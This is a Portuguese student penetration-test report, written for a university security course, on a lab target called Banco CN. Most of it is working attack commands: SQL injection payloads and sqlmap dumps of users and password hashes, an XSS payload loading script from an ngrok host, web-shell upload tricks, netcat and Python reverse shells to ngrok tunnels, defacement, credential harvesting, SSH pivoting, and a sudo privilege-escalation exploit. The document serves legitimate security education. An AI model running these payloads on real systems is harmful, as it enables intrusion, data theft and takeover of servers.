# Relatório do Ataque ao Banco CN

Esse é um relatório de um ataque ao Banco CN, que foi feito para a disciplina de Segurança da Informação, do curso de Ciência da Computação da Universidade Federal de Lavras.
O ataque foi feito em um ambiente controlado, com o objetivo de simular um ataque real, e assim, poder aprender mais sobre segurança da informação.

## Informações:

Email: <contato@bancocn.com>
Tel: +835 66 7070, se nao der certo 70 de novo
<emprestimos@bancocn.com>

<www.bancocn.com/admin>

### Uso de whois para descobrir mais ips

### ip da cloudFlare - waf00f - ve se tem firewall

bancocn.com has address 172.67.192.199
bancocn.com has address 104.21.52.8

### subdomínios

shop.bancocn.com.
172.18.100.7

www.bancocn.com.
172.67.192.199

www.bancocn.com.
104.21.52.8

### usando sudo nmap

PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
8443/tcp open  https-alt

### usando o sudo -O nmap para pegar o sistema operacional

Device type: bridge|general purpose|switch
Running (JUST GUESSING): Oracle VirtualBox (98%), QEMU (93%), Bay Networks embedded (88%)

### serviços totais

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Cloudflare http proxy
|_http-title: Did not follow redirect to http://www.bancocn.com/
|_http-server-header: cloudflare
443/tcp  open  ssl/https     cloudflare
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: cloudflare
8080/tcp open  http          Cloudflare http proxy
|_http-title: Did not follow redirect to http://www.bancocn.com/
|_http-server-header: cloudflare
8443/tcp open  ssl/https-alt cloudflare
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_http-server-header: cloudflare
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: bridge|general purpose|switch
Running (JUST GUESSING): Oracle Virtualbox (98%), QEMU (93%), Bay Networks embedded (88%)
OS CPE: cpe:/o:oracle:virtualbox cpe:/a:qemu:qemu cpe:/h:baynetworks:baystack_450
Aggressive OS guesses: Oracle Virtualbox (98%), QEMU user mode network gateway (93%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

### Information Disclorsure

Apache/2.4.29 (Ubuntu) Server at www.bancocn.com Port 80

### Directory: http://www.bancocn.com/assets

## SQL injection

* Vendo o nome do banco de dados
www.bancocn.com/cat.php?id=-1 union select 1,2,database()

* Vendo os usuários
www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(login) from users

retorna: admin

* Verificando as senhas
www.bancocn.com/cat.php?id=-1 union select 1,2,group_concat(password) from users

retorna:
7b71be0e85318117d2e514ce2a2e222c
(hash da senha - não consegue descriptografar, apenas com ataque bruto)

Por meio do hash killer
Senha é: senhafoda

Para automatizar, a gente pode usar o comando sqlmap

sqlmap -u "http://bancocn.com/cat.php?id=1" 

sqlmap -r header.txt -D bancocn -tables

sqlmap -r header.txt -D bancocn -T users --collumns

sqlmap -r header.txt -D bancocn -T users -C login, password --dump

sqlmap -r header.txt --dump-all

## Ataque XXS

python3 -m http.server
Mas  é melhor usar o site ngrok

Depois colocamos na url:
www.bancocn.com/cat.php?id=2'<script src="https://d97d-45-229-123-11.ngrok-free.app/script.js"></script>

## Fazendo upload de shell
Utilizando variaveis de extensão para passar pela verificação, exemplos:
.php7
.php5
.html.php
.jpg.php

http://www.bancocn.com/admin/uploads/shell.php7?cmd=ls

## Agora vamos conectar o servidor com a nossa maquina

### Usando o netcat para ouvir a porta

Começamos com o comando:
nc -lvp 789 // no servidor do atacante

### Usando o ngrok para fazer o tunelamento

./ngrok tcp 789

url: 0.tcp.sa.ngrok.io
porta: 14328

Depois no url:
www.bancocn.com/admin/uploads/shell.php7?cmd=nc [URL] [PORTA] -e /bin/bash
www.bancocn.com/admin/uploads/shell.php7?cmd=nc 0.tcp.sa.ngrok.io 18114 -e /bin/bash

### Fazendo Reverse Python

www.bancocn.com/admin/uploads/shell.php7?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",17041));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

Fazer de forma interativa:

python -c "import pty;pty.spawn('/bin/bash')"

### Modificando o site

cd /var/www/html

cat index.php // ve o código do site

echo "Lucas Henrique" > index.php

### Pegando o banco de dados

cat /var/www/html/admin/uploads/bancocn.sql

### Hashes

utiliza o comando:

cd /var/backups

cat creds.txt

hash: 

john hash.txt

# Credenciais

Acesso do administrador:
admin
senhafoda

Encontro de mais um acesso:
bob
123456

# Aumentando privilégios

## Achando ips

ifconfig

exemplo, 10.20.20.1
10.20.20.2

... e vai alternando até 256

## Verificando os pins, para tentar achar alguma máquina para escalar privilégio - usando bashscript

// pegando apenas os ips ativos na rede
for i in {1..254}; do (ping -c 1 10.20.20.$i | grep "64 bytes" &); done

64 bytes from 10.20.20.1: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 10.20.20.2: icmp_seq=1 ttl=64 time=0.025 ms
64 bytes from 10.20.20.3: icmp_seq=1 ttl=64 time=0.100 ms // maquina nova
64 bytes from 10.20.20.156: icmp_seq=1 ttl=64 time=0.120 ms

## Busca de portas

nc -w 1 -zv 10.20.20.3 1-500

bancocn-lab-post.bancocn_internal_network [10.20.20.3] 22 (ssh) open

// mostra que a porta 22 está aberta e é uma máquina também, que é possivelmente do bob

## Acessando o usuário - logando com o ssh

ssh bob@10.20.20.3
usa a senha: 123456

// usando o ssh, você acessa um pivot, que é uma máquina dentro de outra máquina

## Processo de pos exploração

### Usando transferência de arquivos

Abrindo outro nc para receber o arquivo

// maquina local
nc -lvp 789

// maquina do bancocn
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

nc -lvp 456 < LinEnum.sh

// no outro terminal do bob a gente faz o download do arquivo - maquina bob
cd /tmp

nc 10.20.20.2 456 > lin.sh

// espera um tempo e cancela a conexão no bancocn, depois aguarda e vai aparecer no bob

// agora vamos rodar o script

bash lin.sh

## Pesquisando vulnerabilidades

// Versão do Kernel: 5.4.0 - pesquisando no terminal

searchsploit linux kernel 5.4.0

// versão do sudo

searchsploit 1.9.5p1

// achou uma versão que tem vulnerabilidade, pesquisa no google

## Escalando privilégios

// baixa uma versão que não precisa de brute force

https://github.com/CptGibbon/CVE-2021-3156

### Passando arquivos

// roda no ngronk

nc -lvp 789 < hax.c

// na maquina do bob

nc 0.tcp.sa.ngrok.io 18114 > hax.c

// roda no ngronk novamente

nc -lvp 789 < lib.c

nc 0.tcp.sa.ngrok.io 18114 > lib.c

// roda no ngronk novamente

nc -lvp 789 < Makefile

nc 0.tcp.sa.ngrok.io 18114 > Makefile

// roda o executável

make

// roda o exploit

./exploit

// agora estamos como root

whoiam - mostra o usuário

// agora podemos rodar comandos como root

## Pivoting

### Instalação necessário

export PATH=$PATH:/usr/bin

EXPORT TERM=linux

apt install nmap

### Usando o nmap

nmap 10.20.20.0/24 -sn

